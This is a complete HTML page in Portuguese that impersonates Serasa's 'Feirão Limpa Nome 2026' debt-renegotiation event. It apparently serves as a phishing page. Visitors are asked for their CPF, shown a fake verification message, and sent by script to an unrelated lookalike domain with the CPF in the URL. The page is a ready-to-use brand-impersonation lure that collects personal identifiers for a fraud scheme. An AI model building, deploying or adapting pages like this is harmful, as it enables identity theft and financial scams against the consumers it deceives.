<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Serasa - Feirão Limpa Nome 2026</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --color-primary: #e91e63;
            --color-secondary: #e91e63;
            --color-tertiary: #ffffff;
            --color-background: #f5f5f5;
            --color-text: #3a4859;
            --color-error: #ff0000;
            --color-success: #00a651;
            --font-primary: "Montserrat", "Futura Bold", sans-serif;
            --font-secondary: "Montserrat", "Futura Book", sans-serif;
            --border-radius: 8px;
            --box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
            --transition: all 0.3s ease;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: var(--font-secondary);
            background: linear-gradient(135deg, #e91e63, #f48fb1 100%);
            color: var(--color-text);
            line-height: 1.6;
        }

        #template {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        #template-wrapper {
            background-color: var(--color-tertiary);
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            width: 100%;
            max-width: 480px;
            overflow: hidden;
            transition: var(--transition);
        }

        #template-wrapper-content {
            padding: 30px;
        }

        #template-header {
            text-align: center;
            margin-bottom: 25px;
        }

        #template-logo {
            height: 45px;
            margin: 0 auto 15px auto;
            display: block;
        }

        .title {
            color: var(--color-primary);
            font-family: var(--font-primary);
            font-size: 1.2rem;
            font-weight: 600;
            margin-bottom: 10px;
            text-align: center;
        }

        .description {
            color: var(--color-text);
            font-size: 1rem;
            text-align: center;
            margin-bottom: 25px;
        }

        .float-label-group {
            margin-bottom: 25px;
        }

        .float-label {
            position: relative;
            margin-bottom: 20px;
        }

        .float-label input {
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: var(--transition);
            background-color: #fff;
            color: var(--color-text);
        }

        .float-label input:focus {
            border-color: var(--color-secondary);
            outline: none;
            box-shadow: 0 0 0 2px rgba(233, 30, 99, 0.2);
        }

        .float-label label {
            position: absolute;
            top: -10px;
            left: 10px;
            background-color: white;
            padding: 0 5px;
            font-size: 0.85rem;
            color: var(--color-primary);
            font-weight: 500;
        }

        .button-group {
            margin-top: 20px;
        }

        button.button-primary {
            width: 100%;
            padding: 15px;
            background-color: var(--color-secondary);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-family: var(--font-primary);
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        button.button-primary:hover {
            background-color: #d81b60;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        button.button-primary:active {
            transform: translateY(0);
        }

        button.button-primary:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        button.button-primary i {
            margin-right: 8px;
        }

        #resultado {
            margin-top: 25px;
            padding: 20px;
            border-radius: var(--border-radius);
            display: none;
            font-size: 0.95rem;
            line-height: 1.5;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }

        #resultado.sucesso {
            background-color: rgba(0, 166, 81, 0.1);
            color: var(--color-success);
            border-left: 4px solid var(--color-success);
            display: block;
        }

        #resultado.erro {
            background-color: rgba(255, 0, 0, 0.1);
            color: var(--color-error);
            border-left: 4px solid var(--color-error);
            display: block;
        }

        .loader {
            display: none;
            border: 3px solid rgba(233, 30, 99, 0.1);
            border-top: 3px solid var(--color-primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 25px auto;
        }

        .loader.active {
            display: block;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        #template-info {
            text-align: center;
            margin-top: 30px;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }

        .faq-layout {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #template-wrapper-help {
            margin-right: 10px;
        }

        .faq-link {
            font-weight: bold;
            color: var(--color-primary);
            text-decoration: none;
            cursor: pointer;
        }

        .faq-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 576px) {
            #template-wrapper-content {
                padding: 20px;
            }

            .title {
                font-size: 1.1rem;
            }

            .description {
                font-size: 0.9rem;
            }

            .float-label input {
                padding: 12px;
            }

            button.button-primary {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div id="template">
        <div id="template-wrapper">
            <div id="template-wrapper-content">
                <header id="template-header">
                    <img alt="logo serasa" id="template-logo" src="/images/image.png">
                </header>

                <section id="template-section">
                    <h4 class="title">
                        <i class="fas fa-hand-holding-usd"></i> Feirão Limpa Nome 2026
                    </h4>
                    <p class="description">
                        O Feirão Limpa Nome 2026 começou! Faça login com seu CPF e aproveite até 90% de desconto nas suas dívidas
                    </p>

                    <form id="cpf-form">
                        <div class="float-label-group">
                            <div class="float-label">
                                <input
                                    type="text"
                                    id="cpf"
                                    name="cpf"
                                    placeholder=""
                                    maxlength="14"
                                    required
                                />
                                <label for="cpf">
                                    <i class="fas fa-id-card"></i> CPF
                                </label>
                            </div>
                        </div>

                        <div class="button-group">
                            <button type="submit" id="verificarBtn" class="button-primary">
                                <i class="fas fa-search"></i> Verificar meus descontos
                            </button>
                        </div>
                    </form>

                    <div class="loader" id="loader"></div>
                    <div id="resultado"></div>
                </section>

                <footer id="template-info">
                    <section id="template-faq">
                        <div class="faq-layout">
                            <div id="template-wrapper-help">
                                <i class="fas fa-question-circle" style="color: var(--color-primary); font-size: 20px;"></i>
                            </div>
                            <a href="#faq" class="faq-link">Preciso de ajuda</a>
                        </div>
                    </section>
                </footer>
            </div>
        </div>
    </div>

    <script>
        const cpfInput = document.getElementById('cpf');
        const form = document.getElementById('cpf-form');
        const loader = document.getElementById('loader');
        const resultado = document.getElementById('resultado');
        const verificarBtn = document.getElementById('verificarBtn');

        // Formatar CPF
        function formatarCPF(value) {
            let cpf = value.replace(/\D/g, '');
            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            return cpf;
        }

        cpfInput.addEventListener('input', function(e) {
            e.target.value = formatarCPF(e.target.value);
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const cpfNumbers = cpfInput.value.replace(/\D/g, '');
            
            if (cpfNumbers.length !== 11) {
                resultado.className = 'erro';
                resultado.textContent = 'CPF inválido. O CPF deve conter 11 dígitos.';
                return;
            }

            // Mostrar loader
            loader.classList.add('active');
            resultado.style.display = 'none';
            verificarBtn.disabled = true;
            verificarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';

            setTimeout(function() {
                loader.classList.remove('active');
                resultado.className = 'sucesso';
                resultado.textContent = 'CPF verificado com sucesso! Redirecionando...';
                
                // Redirecionar após 1 segundo
                setTimeout(function() {
                    window.location.href = `https://accordoonline.online/aproveite/${cpfNumbers}`;
                }, 1000);
            }, 2000);
        });
    </script>
</body>
</html>
